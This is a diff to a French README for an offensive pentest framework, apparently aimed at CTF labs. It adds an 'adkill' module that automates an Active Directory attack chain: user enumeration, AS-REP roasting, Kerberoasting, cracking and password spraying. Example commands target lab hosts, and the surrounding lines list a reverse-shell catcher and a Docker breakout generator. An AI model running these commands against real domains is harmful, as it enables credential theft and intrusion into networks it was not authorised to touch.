@@ -43,6 +43,8 @@ python arsenal.py update
 3. **Furtivité Intégrée :** Détection automatique des pare-feux applicatifs (WAF) pour éviter le bannissement d'IP.
 4. **Tooling Autonome :** Remplace les outils lourds (comme Burp Suite ou netcat) grâce à ses modules natifs (`intruder`, `catch`, `decoder`).
 
+---5. **Chaîne Réactive (Observers) :** Le module `adkill` repose sur un système d'observateurs : chaque hash récupéré déclenche automatiquement son cassage, et chaque credential validé relance la phase d'attaque suivante. Un seul AS-REP cracké peut dérouler toute la Kill Chain Active Directory sans intervention.
+
 ---
 
 ## 📂 Architecture du Framework
@@ -91,6 +93,7 @@ L'Arsenal est piloté par un routeur central asynchrone. Utilisez `python arsena
 | Commande | Action |
 | --- | --- |
 | `python arsenal.py catch -p 4444` | **Shell Catcher :** Écoute un reverse shell et injecte automatiquement les commandes de stabilisation PTY (adieu `nc`). |
+| `python arsenal.py adkill -d <domaine> --dc-ip <IP>` | **AD Kill Chain :** Chaîne Active Directory réactive. Énumère les users (Kerberos pre-auth), AS-REP/Kerberoast, puis crack automatique en cascade. |
 | `python arsenal.py docker --lhost <IP>` | **Docker Breakout :** Génère un script Bash d'évasion pour fuir un conteneur et compromettre l'hôte. |
 | `python arsenal.py smb -T <IP>` | **SMB Ghost :** Test de Null Session et énumération des partages Windows (Port 445). |
 | `python arsenal.py crack --hash <hash>` | **Hash Cracker :** Casse les hashes (MD5, SHA1, SHA256) hors-ligne. |
@@ -132,7 +135,8 @@ L'Arsenal est piloté par un routeur central asynchrone. Utilisez `python arsena
 | **`smb`** | Énum. Null Session | `-T / --target` | *Aucun* |
 | **`s3`** | Chasse buckets AWS | `-n / --name` | *Aucun* |
 | **`ldap`** | Requête LDAP | `-T / --target` | *Aucun* |
-| **`js-sniper`**| Extracteur secrets JS| `-u / --url` | `-t / --threads` (`10`) |
+| **`adkill`** | Chaîne AD automatisée | `-d / --domain`, `--dc-ip` | `-U / --userlist`, `-w / --wordlist` (`/usr/share/wordlists/rockyou.txt`), `--spray` |
+| **`js-sniper`]| Extracteur secrets JS| `-u / --url` | `-t / --threads` (`10`) |
 | **`docker`** | Évasion conteneur | `--lhost` | `--lport` (`4444`), `-o` (`breakout.sh`) |
 | **`export`** | Export HTML | *Aucun* | *Aucun* |
 | **`notes`** | Visionneuse terminal | *Aucun* | *Aucun* |
@@ -198,6 +202,29 @@ python arsenal.py docker --lhost 10.10.14.5 --lport 9001 -o escape.sh
 
 **4. Génération du Rapport Final :**
 Une fois la machine "Rootée", on exporte le tableau de bord pour le client.
+```bash
+python arsenal.py export
+```
+
+---
+
+### Scénario 3 : L'Assaut Active Directory (Domain Domination)
+*Objectif : Vous faites face à un Domain Controller. Aucun credential en main, juste une liste d'utilisateurs potentiels.*
+
+**1. Lancement de la Chaîne Réactive :**
+On déclenche l'orchestrateur AD. Il énumère les comptes valides via Kerberos, traque les comptes vulnérables à l'AS-REP Roasting, et tente le cassage en cascade automatiquement.
+```bash
+python arsenal.py adkill -d corp.htb --dc-ip 10.10.10.100 -U wordlists/users.txt
+```
+
+**2. Password Spraying Ciblé :**
+La chaîne a confirmé des utilisateurs valides mais aucun hash craqué ? On teste un mot de passe classique sur l'ensemble des comptes découverts (1 essai/compte pour éviter le verrouillage).
+```bash
+python arsenal.py adkill -d corp.htb --dc-ip 10.10.10.100 -U wordlists/users.txt --spray 'Welcome2026!'
+```
+
+**3. Capitalisation :**
+Tout credential validé ou hash cassé est automatiquement versé dans le LootStore. On exporte le butin pour préparer le pivot (Kerberoast → mouvement latéral).
 ```bash
 python arsenal.py export
 ```
